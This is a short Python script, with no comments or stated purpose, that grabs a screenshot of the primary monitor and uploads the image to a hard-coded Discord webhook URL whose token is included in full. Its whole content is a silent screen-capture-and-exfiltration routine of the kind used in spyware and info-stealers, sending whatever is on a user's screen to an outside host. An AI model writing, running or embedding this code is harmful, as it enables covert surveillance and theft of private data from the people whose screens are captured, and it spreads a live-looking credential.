import mss
import requests
import io

WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"

with mss.mss() as sct:
    screenshot = sct.grab(sct.monitors[1])
    png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
    
    requests.post(
        WEBHOOK_URL,
        files={'file': ('screenshot.png', io.BytesIO(png_bytes), 'image/png')},
        data={'content': 'Screenshot captured'}
    )
